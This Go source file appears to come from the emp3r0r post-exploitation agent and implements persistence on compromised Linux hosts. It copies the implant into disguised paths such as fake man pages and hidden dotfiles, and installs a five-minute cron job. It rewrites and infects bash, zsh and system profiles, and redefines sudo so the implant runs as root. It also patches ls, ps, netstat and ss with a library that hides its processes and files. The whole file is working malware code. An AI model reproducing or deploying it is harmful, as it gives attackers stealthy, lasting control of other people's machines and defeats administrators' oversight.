//go:build linux
// +build linux

package agent

import (
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"os/user"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var (
	// PersistMethods CC calls one of these methods to get persistence, or all of them at once
	// look at emp3r0r_data.PersistMethods too
	PersistMethods = map[string]func() error{
		"profiles": profiles,
		"cron":     cronJob,
		"patcher":  patcher,
	}

	// Hidden_PIDs list of hidden files/pids
	// see loader.c
	Hidden_PIDs  = "/usr/share/at/batch-job.at"
	Hidden_Files = "/usr/share/at/daily-job.at"

	// Patched_List list of patched sys utils
	Patched_List = []string{
		"/usr/bin/ls",
		"/usr/bin/dir",
		"/usr/bin/ps",
		"/usr/bin/pstree",
		"/usr/bin/netstat",
		"/usr/bin/ss",
	}

	// EmpLocations all possible locations
	EmpLocations = []string{
		// root
		"/env",
		"/usr/bin/x", // see loader.c
		"/usr/bin/.env",
		"/usr/local/bin/env",
		"/bin/.env",
		"/usr/share/man/man1/arch.gz",
		"/usr/share/man/man1/ls.1.gz",
		"/usr/share/man/man1/arch.5.gz",
	}

	EmpLocationsNoRoot = []string{
		// no root required
		"/tmp/.env",
		"/dev/shm/.env",
		fmt.Sprintf("%s/.wget-hst",
			os.Getenv("HOME")),
		fmt.Sprintf("%s/.less-hist",
			os.Getenv("HOME")),
		fmt.Sprintf("%s/.sudo_as_admin_successful",
			os.Getenv("HOME")),
		fmt.Sprintf("%s/.env",
			os.Getenv("HOME")),
		fmt.Sprintf("%s/.pam",
			os.Getenv("HOME")),
	}
)

// installToAllLocations copy emp3r0r to multiple locations
func installToAllLocations() {
	locations := EmpLocations
	if !HasRoot() {
		locations = EmpLocationsNoRoot
	}
	for _, path := range locations {
		err := CopySelfTo(path)
		if err != nil {
			log.Print(err)
			continue
		}
	}
}

func installToRandomLocation() (target string, err error) {
	locations := EmpLocations
	if !HasRoot() {
		locations = EmpLocationsNoRoot
	}
	target = locations[util.RandInt(0, len(locations))]
	err = CopySelfTo(target)
	return
}

// PersistAllInOne run all persistence method at once
func PersistAllInOne() (final_err error) {
	for k, method := range PersistMethods {
		res := "succeeded"
		method_err := method()
		if method_err != nil {
			res = fmt.Sprintf("failed: %v", method_err)
		}
		e := fmt.Errorf("%s: %s", k, res)
		if e != nil {
			final_err = fmt.Errorf("%v; %v", final_err, e)
		}
	}
	return
}

func cronJob() (err error) {
	exe_location, err := installToRandomLocation()
	if err != nil {
		return err
	}
	return AddCronJob("*/5 * * * * PERSISTENCE=true " + exe_location)
}

func profiles() (err error) {
	exe, err := installToRandomLocation()
	if err != nil {
		return err
	}
	user, err := user.Current()
	if err != nil {
		return fmt.Errorf("Cannot get user profile: %v", err)
	}
	accountInfo, err := CheckAccount(user.Name)
	if err != nil {
		return fmt.Errorf("Cannot check account info: %v", err)
	}

	// source
	bashprofile := fmt.Sprintf("%s/.bashrc", user.HomeDir)
	sourceCmd := "source ~/.bashprofile"
	if HasRoot() {
		bashprofile = "/etc/bash_profile"
		sourceCmd = "source /etc/bash_profile"
	}

	// call this to start emp3r0r
	payload := exe

	// set +m to silent job control
	payload = "set +m;" + payload

	// nologin users cannot do shit here
	if strings.Contains(accountInfo["shell"], "nologin") ||
		strings.Contains(accountInfo["shell"], "false") {
		if user.Uid != "0" {
			return errors.New("This user cannot login")
		}
	}

	// loader
	loader := fmt.Sprintf("export PERSISTENCE=true\n%s 2>/dev/null", payload)

	// exec our payload as root too!
	// sudo payload
	var sudoLocs []string
	for _, loc := range EmpLocations {
		sudoLocs = append(sudoLocs, "/usr/bin/sudo -E "+loc)
	}
	sudoPayload := strings.Join(sudoLocs, "||")
	loader += fmt.Sprintf("\nfunction sudo() { /usr/bin/sudo $@; (set +m;(%s 2>/dev/null)) }", sudoPayload)
	err = ioutil.WriteFile(bashprofile, []byte(loader), 0644)
	if err != nil {
		return
	}

	// check if profiles are already written
	data, err := ioutil.ReadFile(user.HomeDir + "/.bashrc")
	if err != nil {
		log.Println(err)
		return
	}
	if strings.Contains(string(data), sourceCmd) {
		err = errors.New("already written")
		return
	}
	// infect all profiles
	_ = util.AppendTextToFile(user.HomeDir+"/.profile", sourceCmd)
	_ = util.AppendTextToFile(user.HomeDir+"/.bashrc", sourceCmd)
	_ = util.AppendTextToFile(user.HomeDir+"/.zshrc", sourceCmd)
	_ = util.AppendTextToFile("/etc/profile", "source "+bashprofile)

	return
}

// AddCronJob add a cron job without terminal
// this creates a cron job for whoever runs the function
func AddCronJob(job string) error {
	cmdStr := fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", job)
	cmd := exec.Command("/bin/sh", "-c", cmdStr)
	return cmd.Start()
}

// patch ELF file so it automatically loads and runs loader.so
func patcher() (err error) {
	if !HasRoot() {
		return errors.New("Root required")
	}
	so_path, err := prepare_loader_so(0)
	if err != nil {
		return
	}

	// create hidden list
	if !util.IsFileExist(Hidden_PIDs) {
		// pid+1 is for elvsh process
		pids := fmt.Sprintf("%d\n%d", os.Getpid(), os.Getpid()+1)

		// mkdir
		os.MkdirAll("/usr/share/at", 0755)

		// PIDs
		err = ioutil.WriteFile(Hidden_PIDs, []byte(pids), 0644)
		if err != nil {
			log.Printf("Cannot create %s: %v", Hidden_PIDs, err)
		}

		// files
		files := fmt.Sprintf("%s", util.FileBaseName(RuntimeConfig.AgentRoot))
		err = ioutil.WriteFile(Hidden_Files, []byte(files), 0644)
		if err != nil {
			log.Printf("Cannot create %s: %v", Hidden_Files, err)
		}
	}

	// patch system utilities
	for _, file := range Patched_List {
		e := AddNeededLib(file, so_path)
		if e != nil {
			err = fmt.Errorf("%v; %v", err, e)
		}
	}
	return
}
